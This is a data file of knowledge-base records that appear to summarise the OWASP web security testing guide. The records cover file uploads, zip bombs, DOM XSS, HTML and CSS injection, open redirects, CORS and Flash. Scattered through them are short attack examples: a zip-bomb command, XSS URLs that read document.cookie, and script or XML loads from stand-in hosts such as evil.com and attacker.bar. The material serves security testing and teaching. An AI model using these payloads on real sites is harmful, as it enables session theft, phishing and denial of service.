{"id": "kb-001620", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "In nginx, a misconfiguration might allow files to be uploaded and executed that shouldn't be, such as uploading a file as 'test.jpg/x.php' facilitating the execution of 'x.php'."}
{"id": "kb-001621", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "To ensure uploaded files are safe, applications should employ anti-malware scanning, such as using the EICAR test file, a benign file that is flagged by antivirus software, to test the effectiveness of the malware detection process."}
{"id": "kb-001622", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Depending on the type of application, it may be necessary to test for dangerous file types, such as Office documents containing malicious macros. Tools like the Metasploit Framework and the Social Engineer Toolkit (SET) can generate malicious files for various formats."}
{"id": "kb-001623", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "When a potentially malicious file is uploaded, the application should ideally detect and either quarantine or delete the file to ensure security."}
{"id": "kb-001624", "section": null, "tags": ["PATH"], "source": "wstg-v4.2.pdf", "text": "Directory Traversal can be exploited in applications that extract archives, allowing an attacker to write to unintended locations by using paths like ..\\..\\..\\..\\shell.php."}
{"id": "kb-001625", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "A Zip bomb is a type of decompression bomb designed to cause a denial of service by exhausting resources; it can be created by compressing a large file into a small archive, exemplified by creating a 1MB file that decompresses to 1GB using the command `dd if=/dev/zero bs=1M count=1024 | zip -9 > bomb.zip`."}
{"id": "kb-001626", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Higher compression ratios in Zip bombs can be achieved through multiple compression levels, format abuse, and quines that create infinite recursion. Zip bomb attacks can lead to denial of service and potentially increase costs, particularly if hosted on auto-scaling cloud platforms."}
{"id": "kb-001627", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "XML files may have vulnerabilities like XML eXternal Entities (XXE) and specific denial of service attacks such as the billion laughs attack, which are susceptible to testing for XML injection."}
{"id": "kb-001628", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "Other file formats such as CSV files, Office documents, and PDFs each have unique security concerns like CSV injection, malicious macros, and JavaScript code execution, respectively, necessitating thorough review and testing for potential exploits."}
{"id": "kb-001629", "section": null, "tags": ["API", "UPLOAD"], "source": "wstg-v4.2.pdf", "text": "Common API/methods in source code for file uploads include 'new file', import 'upload', 'getFileName', and other file manipulation functions in Java, as well as 'open' and 'fopen' in C/C++."}
{"id": "kb-001630", "section": null, "tags": ["UPLOAD"], "source": "wstg-v4.2.pdf", "text": "Web Security Testing involves assessing how web applications handle file uploads, particularly focusing on ensuring security against malicious file uploads."}
{"id": "kb-001631", "section": null, "tags": ["UPLOAD"], "source": "wstg-v4.2.pdf", "text": "PHP functions relevant to file handling include: move_uploaded_file(), readfile(), file_put_contents(), file(), parse_ini_file(), copy(), fopen(), include(), and require(). These functions are critical in the context of file upload handling and security implications."}
{"id": "kb-001632", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "A common security test case is to check 'File Extensions Handling for Sensitive Information', which ensures that sensitive files are not uploaded or accessed unknowingly. Testing for 'XML Injection' involves ensuring that uploaded XML files do not lead to vulnerabilities through XML parsing."}
{"id": "kb-001633", "section": null, "tags": ["API", "UPLOAD"], "source": "wstg-v4.2.pdf", "text": "To test the upload of unexpected file types, ensure that the web application restricts file uploads to only allowed formats, preventing the upload of potentially harmful files."}
{"id": "kb-001634", "section": null, "tags": ["UPLOAD"], "source": "wstg-v4.2.pdf", "text": "Remediation strategies highlight that fully protecting against malicious file upload is complex; it requires a tailored approach based on the types of files processed on the server."}
{"id": "kb-001635", "section": null, "tags": ["UPLOAD"], "source": "wstg-v4.2.pdf", "text": "The 'File Upload Cheat Sheet' by OWASP provides comprehensive guidance on mitigating risks associated with file uploads, including implementing secure practices for uploads."}
{"id": "kb-001636", "section": null, "tags": ["CLIENT", "HTTP", "XSS"], "source": "wstg-v4.2.pdf", "text": "DOM-based cross-site scripting (XSS) refers to XSS bugs caused by browser-side content, typically JavaScript, interacting with user input and using it in a way that executes injected code."}
{"id": "kb-001637", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "The Document Object Model (DOM) is the representation of documents in a browser, allowing JavaScript to dynamically reference document components."}
{"id": "kb-001638", "section": null, "tags": ["CLIENT", "XSS"], "source": "wstg-v4.2.pdf", "text": "A DOM-based XSS vulnerability occurs when JavaScript is modified by crafted requests to control a DOM element, leading to executed payloads from an attacker."}
{"id": "kb-001639", "section": null, "tags": ["CLIENT", "XSS"], "source": "wstg-v4.2.pdf", "text": "Unlike reflected or stored XSS vulnerabilities, DOM-based XSS can execute code without server communication, complicating detection and filtration of such attacks."}
{"id": "kb-001640", "section": null, "tags": ["CLIENT", "XSS"], "source": "wstg-v4.2.pdf", "text": "Example of a DOM-based XSS attack: '<script> document.write(\"Site is at: \" + document.location.href + \".\"); </script>' can be exploited by appending '#<script>alert('xss')</script>' to the URL, triggering an alert box in the user's browser."}
{"id": "kb-001641", "section": null, "tags": ["CLIENT", "HTTP", "SESSION", "XSS"], "source": "wstg-v4.2.pdf", "text": "Consequences of DOM-based XSS can include retrieval of cookies and further malicious script injections, warranting serious attention and treatment similar to other XSS types. Test objectives for assessing DOM-based XSS include identifying DOM sinks and building payloads for each sink type. JavaScript applications are dynamically generated by the server, which affects testing methods. Crawling the website is essential to understand executed code and identify user input points. JavaScript relies on large libraries, which can complicate testing due to their size and complexity. Top-down testing is often more feasible than bottom-up testing for large codebases, especially when many functions may be unused. User input in JavaScript can come from server-generated content or client-side JavaScript objects."}
{"id": "kb-001642", "section": null, "tags": ["CLIENT", "HTTP"], "source": "wstg-v4.2.pdf", "text": "Two examples of server-inserted input are:\n1. var data = \"<escaped data from the server>\";\n2. var result = someFunction(\"<escaped data from the server>\"); Client-side JavaScript input examples include:\n1. var data = window.location;\n2. var result = someFunction(window.referrer); Input handled server-side allows for more control over data, while client-side results may depend on browser encoding."}
{"id": "kb-001643", "section": null, "tags": ["CLIENT", "XSS"], "source": "wstg-v4.2.pdf", "text": "JavaScript can execute outside <script> blocks, which poses risks for XSS attacks; hence, different execution contexts need to be crawled carefully."}
{"id": "kb-001644", "section": null, "tags": ["CLIENT", "XSS"], "source": "wstg-v4.2.pdf", "text": "Automated testing for DOM-based XSS has limitations; it typically cannot validate XSS by relying solely on server response payload observation, requiring more nuanced techniques for detection."}
{"id": "kb-001645", "section": null, "tags": ["CLIENT", "XSS"], "source": "wstg-v4.2.pdf", "text": "Automated testing tools may not be sufficient in detecting DOM-based XSS vulnerabilities unless they are capable of analyzing client-side code thoroughly."}
{"id": "kb-001646", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Manual testing is crucial for identifying potential vulnerabilities in areas of the code where parameters could be exploited by an attacker. This includes inspecting:"}
{"id": "kb-001647", "section": null, "tags": ["CLIENT", "XSS"], "source": "wstg-v4.2.pdf", "text": "1. Code that dynamically writes content to the page,\n2. Areas where the Document Object Model (DOM) is modified,\n3. Scripts that are directly executed on the page. Important resources for remediation strategies include the DOM-based XSS Prevention Cheat Sheet and the DomXSSWiki."}
{"id": "kb-001648", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The document provides an example of how user-agent detection can be implemented via script but emphasizes that without careful examination, vulnerabilities may remain undetected."}
{"id": "kb-001649", "section": null, "tags": ["CLIENT", "XSS"], "source": "wstg-v4.2.pdf", "text": "A JavaScript injection vulnerability is a subtype of cross site scripting (XSS) that allows arbitrary JavaScript code to be executed in the victim's browser."}
{"id": "kb-001650", "section": null, "tags": ["CLIENT", "HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Consequences of JavaScript injection vulnerabilities include disclosure of session cookies and altering the content or behavior of web applications. Such vulnerabilities often arise due to the lack of proper input and output validation for user-supplied input."}
{"id": "kb-001651", "section": null, "tags": ["CLIENT", "HTTP"], "source": "wstg-v4.2.pdf", "text": "An example of vulnerable code is using user input in script without validation: var rr = location.search.substring(1); if(rr) { window.location=decodeURIComponent(rr); } which allows injection like: www.victim.com/?javascript:alert(1). Test objectives for identifying JavaScript injection vulnerabilities include identifying ‘sinks’ or entry points for the injected code."}
{"id": "kb-001652", "section": null, "tags": ["CLIENT", "CRYPTO", "XSS"], "source": "wstg-v4.2.pdf", "text": "Considerations when testing include how different characters are treated differently across browsers, and referencing DOM-based XSS for deeper understanding. An example of a vulnerable script shows how dynamic content is loaded without proper validation or context sanitization. The vulnerability highlighted involves the use of the source 'location.hash', which can be manipulated by an attacker. An attacker can inject JavaScript code into the message value, posing a risk of taking control over the user's browser. This demonstrates a security flaw where client-side scripting can be exploited if proper validation and sanitization are not employed."}
{"id": "kb-001653", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "HTML injection is a vulnerability that allows users to inject arbitrary HTML code into web pages when input points are not properly secured."}
{"id": "kb-001654", "section": null, "tags": ["SESSION"], "source": "wstg-v4.2.pdf", "text": "Consequences of HTML injection can include the disclosure of session cookies and the ability for attackers to modify page content viewed by victims."}
{"id": "kb-001655", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "This vulnerability arises from unsanitized user input and unencoded output, enabling the attacker to send a malicious HTML page that the browser executes in the victim's context."}
{"id": "kb-001656", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Common methods that can introduce HTML injection vulnerabilities include the use of innerHTML and document.write() functions without proper input validation."}
{"id": "kb-001657", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Example of vulnerable code snippet:\nvar userposition=location.href.indexOf('user=');\nvar user=location.href.substring(userposition+5);\ndocument.getElementById('Welcome').innerHTML=' Hello, '+user;"}
{"id": "kb-001658", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Another example reflecting vulnerability:\nvar userposition=location.href.indexOf('user=');\nvar user=location.href.substring(userposition+5);\ndocument.write('<h1>Hello, ' + user +'</h1>');"}
{"id": "kb-001659", "section": null, "tags": ["CLIENT", "HTTP"], "source": "wstg-v4.2.pdf", "text": "Demonstration of how an exploit could occur via a URL with malicious input, which could execute arbitrary JavaScript code within the injected HTML context. Test objectives include identifying HTML injection points and assessing the severity of the injected content."}
{"id": "kb-001660", "section": null, "tags": ["CLIENT", "XSS"], "source": "wstg-v4.2.pdf", "text": "The page discusses a specific vulnerability in the context of DOM-based Cross-Site Scripting (DOM XSS), highlighting the potential security risks associated with client-side code execution."}
{"id": "kb-001661", "section": null, "tags": ["CLIENT", "CRYPTO"], "source": "wstg-v4.2.pdf", "text": "A relevant example shows a fragment of HTML and JavaScript code that can allow attackers to inject malicious HTML when utilizing the location hash to identify DOM elements."}
{"id": "kb-001662", "section": null, "tags": ["CLIENT", "CRYPTO", "HTTP"], "source": "wstg-v4.2.pdf", "text": "In the provided script, the function `setMessage()` retrieves the hash from the URL and attempts to manipulate specific DOM elements based on the hash value. However, it fails to sanitize the input properly, thus allowing for code injection."}
{"id": "kb-001663", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "A key statement regarding this vulnerability is: \"It is possible to inject HTML code,\" signifying the risks associated with improper handling of dynamic content in web applications."}
{"id": "kb-001664", "section": null, "tags": ["CLIENT", "CRYPTO", "XSS"], "source": "wstg-v4.2.pdf", "text": "Technical terms include 'DOM XSS,' which refers to executing scripts in the client's browser using Document Object Model (DOM) manipulation, and 'hashchange,' which is an event that fires when the fragment identifier of the URL changes. These concepts are crucial in understanding how vulnerabilities can be exploited in web applications."}
{"id": "kb-001665", "section": null, "tags": ["CLIENT", "HTTP"], "source": "wstg-v4.2.pdf", "text": "Client-side URL redirection, also known as open redirection, is an input validation flaw that occurs when an application accepts user-controlled input that specifies a link leading to an external URL, which could be malicious."}
{"id": "kb-001666", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Open redirection vulnerabilities can facilitate phishing attacks, as the redirect originates from a legitimate application, making the phishing attempt appear more trustworthy."}
{"id": "kb-001667", "section": null, "tags": ["AUTHN", "HTTP"], "source": "wstg-v4.2.pdf", "text": "Example of a phishing URL: http://www.target.site?#redirect=www.fake-target.site. The victim entering this URL would be redirected to fake-target.site, where an attacker could capture their credentials."}
{"id": "kb-001668", "section": null, "tags": ["AUTHZ"], "source": "wstg-v4.2.pdf", "text": "Open redirection can also allow attackers to bypass access control measures, enabling them to access functions or data they should not have permission to."}
{"id": "kb-001669", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Testing for this vulnerability involves identifying injection points that handle URLs, as well as assessing potential redirect destinations."}
{"id": "kb-001670", "section": null, "tags": ["CLIENT", "CRYPTO", "HTTP"], "source": "wstg-v4.2.pdf", "text": "Testers can check client-side code for redirection implementations, which may be done using JavaScript's window.location object. An example code snippet shows how a user-supplied input can be improperly validated, leading to vulnerability: var redir = location.hash.substring(1); if (redir) { window.location='http://'+decodeURIComponent(redir); }"}
{"id": "kb-001671", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "In the example, the variable redir contains user-supplied input which is not validated or encoded before being used in a redirect, demonstrating a potential security flaw."}
{"id": "kb-001672", "section": null, "tags": ["CLIENT", "CRYPTO"], "source": "wstg-v4.2.pdf", "text": "The provided example demonstrates a JavaScript injection vulnerability that can be exploited through manipulation of the URL's hash fragment."}
{"id": "kb-001673", "section": null, "tags": ["CLIENT", "CRYPTO"], "source": "wstg-v4.2.pdf", "text": "In the snippet, 'location.hash' is used to extract the hash part from the URL, and if present, it is decoded and used to redirect the browser's location. This redirect can be redirected to potentially malicious JavaScript code."}
{"id": "kb-001674", "section": null, "tags": ["CLIENT", "HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "Example of exploitation: By using a crafted URL such as 'http://www.victim.site/?#javascript:alert(document.cookie)', an attacker can execute a malicious JavaScript code that alerts the document's cookies, thus breaching user data security."}
{"id": "kb-001675", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "It's important to understand that browsers may treat certain characters in URLs differently, which can affect the exploitation of such vulnerabilities. This highlights the necessity for proper testing across various browsers to ensure comprehensive security assessments."}
{"id": "kb-001676", "section": null, "tags": ["CLIENT", "XSS"], "source": "wstg-v4.2.pdf", "text": "Reference to 'DOM-based XSS' indicates a specific type of cross-site scripting vulnerability where the client-side scripts write to the DOM, demonstrating the intersection of JavaScript and web security."}
{"id": "kb-001677", "section": null, "tags": ["XSS"], "source": "wstg-v4.2.pdf", "text": "A CSS Injection vulnerability allows arbitrary CSS code to be injected into a trusted website, having potential impacts such as cross-site scripting (XSS) or data exfiltration."}
{"id": "kb-001678", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "This vulnerability arises when applications permit user-supplied CSS to interfere with legitimate style sheets, which can enable attackers to execute JavaScript or extract sensitive data."}
{"id": "kb-001679", "section": null, "tags": ["CLIENT", "CRYPTO", "XSS"], "source": "wstg-v4.2.pdf", "text": "An example vulnerable script shows how an attacker can control the 'location.hash', leading to DOM-based XSS, especially in older browser versions. Example code snippet provided leads to XSS: \"if (location.hash.slice(1)) { document.getElementById(\"a1\").style.cssText = \"color: \" + location.hash.slice(1); }\""}
{"id": "kb-001680", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "Links shown that exploit this vulnerability in specific browsers (e.g., Opera and IE): www.victim.com/#red;-o-link:'<javascript:alert(1)>' and www.victim.com/#red;-:expression(alert(URL=1));"}
{"id": "kb-001681", "section": null, "tags": ["HTTP", "XSS"], "source": "wstg-v4.2.pdf", "text": "Further vulnerabilities may arise in reflected XSS scenarios, as exemplified with PHP code inserting user input into CSS: \"<style> p { color: <?php echo $_GET['color']; ?>; text-align: center; } </style>\"."}
{"id": "kb-001682", "section": null, "tags": ["CSRF", "HTTP"], "source": "wstg-v4.2.pdf", "text": "CSS rules can also be utilized to extract sensitive information, such as CSRF tokens, through specific selectors, like selecting an input element with the name 'csrf_token' and a value starting with 'a'."}
{"id": "kb-001683", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "An example of such extraction through CSS selectors demonstrates the use of brute-force attacks to retrieve attribute values by attempting to set background images on specific input elements. CSS injection is a type of web security vulnerability where an attacker can inject custom styling rules that could lead to various attacks."}
{"id": "kb-001684", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "The test objectives for identifying CSS injection points include identifying where user input can affect the CSS context and assessing the potential impact of such injection."}
{"id": "kb-001685", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "To test for CSS injection vulnerabilities, it is suggested to analyze the code to see if user inputs are allowed to influence CSS rules, specifically observing how inputs are processed and returned in the CSS context."}
{"id": "kb-001686", "section": null, "tags": ["CRYPTO", "HTTP"], "source": "wstg-v4.2.pdf", "text": "An example provided demonstrates a situation where an attacker can exploit the location.hash to inject style attributes into HTML elements, which can vary in effect depending on the browser used and the specific payload input."}
{"id": "kb-001687", "section": null, "tags": ["AUTHN", "CLIENT", "HTTP"], "source": "wstg-v4.2.pdf", "text": "The text references various resources and examples of CSS injection vulnerabilities, highlighting areas such as password cracking via CSS and HTML5, CSS attribute reading, and JavaScript-based attacks using unescaped input."}
{"id": "kb-001688", "section": null, "tags": ["CLIENT", "HTTP", "XSS"], "source": "wstg-v4.2.pdf", "text": "A client-side resource manipulation vulnerability arises due to an input validation flaw when an application accepts user-controlled input that specifies the path of a resource, such as the source of an iframe, JavaScript, or XMLHttpRequest. This type of vulnerability can lead to executing Cross-Site Scripting (XSS) attacks."}
{"id": "kb-001689", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "The impact of client-side resource manipulation is that it allows attackers to control URLs linked to resources present in a web page, potentially loading and rendering malicious objects that interfere with the expected behavior of the application."}
{"id": "kb-001690", "section": null, "tags": ["CLIENT", "CRYPTO", "XSS"], "source": "wstg-v4.2.pdf", "text": "An example of a vulnerable JavaScript snippet is provided, where an attacker can control 'location.hash', which determines the source of a script element. This method could be exploited to inject external JavaScript code, leading to XSS attacks."}
{"id": "kb-001691", "section": null, "tags": ["CRYPTO"], "source": "wstg-v4.2.pdf", "text": "The generic snippet includes 'var d=document.createElement(\"script\"); if(location.hash.slice(1)) { d.src = location.hash.slice(1); } document.body.appendChild(d);'. This code creates a new script element and conditionally sets its source based on the URL hash."}
{"id": "kb-001692", "section": null, "tags": ["HTTP", "SESSION"], "source": "wstg-v4.2.pdf", "text": "An attacker could exploit this vulnerability by crafting a URL such as 'www.victim.com/#http://evil.com/js.js', where 'js.js' contains malicious code like 'alert(document.cookie)', which would trigger an alert showing the victim's cookies."}
{"id": "kb-001693", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Another serious risk outlined is the control of URLs in Cross-Origin Resource Sharing (CORS) requests. CORS allows for resources to be accessed based on headers, and an attacker might lead a page to load harmful content from their own domain through a CORS exploit."}
{"id": "kb-001694", "section": null, "tags": ["CRYPTO", "HTTP", "XSS"], "source": "wstg-v4.2.pdf", "text": "The page discusses a cross-site scripting (XSS) vulnerability scenario involving the use of `location.hash` controlled by user input. An attacker can manipulate this input to request an external resource, which can lead to the execution of malicious scripts on a victim's browser."}
{"id": "kb-001695", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Important test objectives for security testing include identifying sinks with weak input validation and assessing the impact of resource manipulation."}
{"id": "kb-001696", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The page emphasizes the need for manual testing to check for vulnerabilities by identifying whether the application validates inputs correctly. Weakly validated inputs could allow attackers to specify and manipulate URLs for external resources."}
{"id": "kb-001697", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Common resources that may include external URLs, which are potential injection points, include images, videos, CSS, and iframes. The page outlines specific sink types such as 'iframe' for frames, 'a' for links, and 'img' for images, with their corresponding attributes that might be exploited."}
{"id": "kb-001698", "section": null, "tags": ["HTTP", "XSS"], "source": "wstg-v4.2.pdf", "text": "A sample payload is given where an attacker might ask a victim to visit a crafted URL, demonstrating the risk of XSS through malicious `innerHTML` execution if the application is not properly sanitizing user input."}
{"id": "kb-001699", "section": null, "tags": ["API", "HTTP"], "source": "wstg-v4.2.pdf", "text": "Cross-origin resource sharing (CORS) allows web browsers to perform cross-domain requests using the XMLHttpRequest L2 API while adhering to security protocols. The XMLHttpRequest L1 API previously restricted requests to the same origin due to the same origin policy. CORS uses HTTP headers to communicate between a browser and a server whether cross-origin requests are permitted."}
{"id": "kb-001700", "section": null, "tags": ["AUTHN", "HTTP"], "source": "wstg-v4.2.pdf", "text": "For non-simple requests (e.g., not just GET or POST, or those using credentials), CORS mandates sending a pre-flight OPTIONS request to verify if the request type is safe."}
{"id": "kb-001701", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "The origin header in a CORS request is sent by the browser to indicate the requester domain. It cannot be modified from JavaScript, making it unreliable for security checks alone."}
{"id": "kb-001702", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "The Access-Control-Allow-Origin header is a server response header that specifies which domains can access the response data, and should be configured securely (e.g., avoiding `*` wildcard)."}
{"id": "kb-001703", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "Insecure configurations, such as echoing back the origin header or allowing all domains, can expose sensitive data and should be addressed during penetration testing."}
{"id": "kb-001704", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Access-Control-Request-Method and Access-Control-Allow-Method are used to specify and confirm the HTTP methods that are allowed for cross-origin requests."}
{"id": "kb-001705", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Access-Control-Request-Headers and Access-Control-Allow-Headers define which headers can be used in a cross-origin request, facilitating an added layer of control over security."}
{"id": "kb-001706", "section": null, "tags": ["AUTHN"], "source": "wstg-v4.2.pdf", "text": "The Access-Control-Allow-Credentials header indicates that user credentials can be included in the final request as part of a pre-flight check."}
{"id": "kb-001707", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "XMLHttpRequest L2 (XHR L2) adds functionality for cross-domain requests, which could introduce security vulnerabilities not present in XHR L1."}
{"id": "kb-001708", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Potential vulnerabilities arise when URLs are passed to XMLHttpRequest without validation, especially when absolute URLs are allowed, leading to possible code injection. If response data is not escaped and user-supplied input can control it, this creates additional security risks."}
{"id": "kb-001709", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "Key headers in CORS include Access-Control-Max-Age, which specifies how long a preflight request can be cached, and Access-Control-Expose-Headers, which indicates safe headers to expose, as per CORS specifications. Testing for CORS involves identifying endpoints that implement CORS and ensuring their configuration is secure."}
{"id": "kb-001710", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "Tools like ZAP can be used to intercept HTTP headers to analyze CORS implementations, particularly the origin header to see which domains are allowed access."}
{"id": "kb-001711", "section": null, "tags": ["CONF"], "source": "wstg-v4.2.pdf", "text": "Example of insecure CORS configuration: Access-Control-Allow-Origin header set to wildcard '*' allows any domain to access resources. Example request and response demonstrate this vulnerability."}
{"id": "kb-001712", "section": null, "tags": ["CRYPTO", "HTTP", "XSS"], "source": "wstg-v4.2.pdf", "text": "Code example highlights an input validation issue leading to XSS through CORS, where XMLHttpRequest is used inappropriately with user-controllable URLs. The page discusses a security vulnerability related to the manipulation of URL hashes in web applications."}
{"id": "kb-001713", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "It provides a specific example demonstrating how an attacker can exploit a lack of URL validation to execute a script from an external domain. The example illustrates an HTTP GET request to 'http://example.foo/main.php#profile.php' which shows the contents of 'profile.php'."}
{"id": "kb-001714", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "It highlights that without proper validation, attackers can create a malicious URL such as 'http://example.foo/main.php#http://attacker.bar/file.php' that allows execution of scripts from the attacker's server. This vulnerability can lead to remote script execution within the context of the target domain, which poses significant security risks."}
{"id": "kb-001715", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "The response from 'attacker.bar' shows how an attacker can craft responses that exploit the trust relationship between the user's browser and the target domain, causing potentially harmful actions (e.g., executing JavaScript that alerts the document domain)."}
{"id": "kb-001716", "section": null, "tags": ["UPLOAD"], "source": "wstg-v4.2.pdf", "text": "ActionScript is the programming language used in Flash applications, having three main versions: ActionScript 1.0, 2.0 (an extension of 1.0), and 3.0 (a complete rewrite for object-oriented design)."}
{"id": "kb-001717", "section": null, "tags": ["XSS"], "source": "wstg-v4.2.pdf", "text": "Cross-Site Flashing (XSF) is a security vulnerability similar to Cross-Site Scripting (XSS), arising from Flash applications' ability to interact with browsers."}
{"id": "kb-001718", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "XSF occurs when one movie loads another from different domains, potentially leading to security issues such as accessing or modifying data in an unwarranted manner, which could include stealing data from the SWF application."}
{"id": "kb-001719", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "URLs used in reflexive redirects can be exploited, with the SWF acting as a mechanism for redirection, which may mislead users to malicious sites under the guise of a trusted domain."}
{"id": "kb-001720", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "An open redirector, in the context of Flash applications, is a function that allows an attacker to redirect users to an external malicious website by manipulating FlashVars within the SWF."}
{"id": "kb-001721", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Phishing attacks can occur when users are tricked into visiting a malicious website that mimics a trusted one, leveraging their trust in the original site."}
{"id": "kb-001722", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "SWF (Shockwave Flash) files may function as open-redirectors if developers do not appropriately validate URLs provided in FlashVars, leading to potential security vulnerabilities."}
{"id": "kb-001723", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Developers are advised to avoid using full URLs in FlashVars and instead utilize relative URLs or validate that the URL starts with a trusted domain and protocol to mitigate risks."}
{"id": "kb-001724", "section": null, "tags": ["API"], "source": "wstg-v4.2.pdf", "text": "Adobe has released multiple versions of Flash Player since May 2007 that have progressively restricted certain types of attacks, indicating an ongoing effort to improve security standards."}
{"id": "kb-001725", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Older methods of manipulating Flash content, such as using ExternalInterface and GetURL, may still pose risks depending on the Flash Player version, as shown in different functionalities across specific versions."}
{"id": "kb-001726", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Decompiling SWF files is possible with tools like flare, allowing for white-box testing and code analysis which can help identify security vulnerabilities within Flash applications."}
{"id": "kb-001727", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "FlashVars are variables intended to receive data from an HTML page into a SWF application, often passed through Object or Embed tags, which can be vulnerable if not handled securely."}
{"id": "kb-001728", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "In ActionScript 3.0, developers must explicitly assign FlashVar values to local variables, exemplified by the snippet: 'var paramObj:Object = LoaderInfo(this.root.loaderInfo).parameters; var var1:String = String(paramObj[\"var1\"]); var var2:String = String(paramObj[\"var2\"]);'."}
{"id": "kb-001729", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "In ActionScript 2.0, uninitialized global variables are treated as FlashVars, meaning attributes like _root.varname can be overwritten by URL parameters, posing a security risk: 'http://victim/file.swf?varname=value'. FlashVars can serve as vectors for attack in both ActionScript 2.0 and 3.0."}
{"id": "kb-001730", "section": null, "tags": ["HTTP"], "source": "wstg-v4.2.pdf", "text": "An example of vulnerable ActionScript 2.0 code demonstrates how FlashVars can be exploited. In the provided code, if the 'language' parameter is not properly validated and filtered, attackers could exploit it to load malicious XML from an external source: 'http://victim/file.swf?language=http://evil.example.org/malicious.xml?'."}
{"id": "kb-001731", "section": null, "tags": ["GENERIC"], "source": "wstg-v4.2.pdf", "text": "Unsafe methods in Flash, identified since version r47, include 'loadVariables()', 'loadMovie()', and 'getURL()'. These methods are potential security vulnerabilities if used with unvalidated data."}
{"id": "kb-001732", "section": null, "tags": ["HTTP", "XSS"], "source": "wstg-v4.2.pdf", "text": "Exploitation by Reflected XSS: Attackers may exploit a reflected cross-site scripting vulnerability by forcing a browser to load a malicious SWF file via methods like social engineering or redirection. An example of this method would include using an iframe to load a malicious SWF file: <iframe src='http://victim/path/to/file.swf'></iframe>."}
{"id": "kb-001733", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "GetURL and NavigateToURL Functions: In ActionScript 2.0, the getURL function and in ActionScript 3.0, the navigateToURL function can load a URI into the browser’s window. If an undefined variable is used with getURL, it poses a security risk as it can lead to JavaScript execution in the context of the hosting domain."}
{"id": "kb-001734", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "Example of potentially unsafe getURL usage: The following code demonstrates a potential security risk where an action can execute JavaScript: getURL(_root.URI,'_targetFrame');"}
{"id": "kb-001735", "section": null, "tags": ["CLIENT"], "source": "wstg-v4.2.pdf", "text": "FlashVars and navigateToURL: A FlashVar can be passed as a parameter to navigateToURL, which could allow for JavaScript injection: var request:URLRequest = new URLRequest(FlashVarSuppliedURL); navigateToURL(request);"}
{"id": "kb-001736", "section": null, "tags": ["API", "CLIENT"], "source": "wstg-v4.2.pdf", "text": "Using JavaScript through SWF: An attacker can craft a malicious URI that uses JavaScript, such as: getURL('javascript:evilcode','_self'); to execute the code within the same domain, effectively bypassing same-origin policy restrictions."}
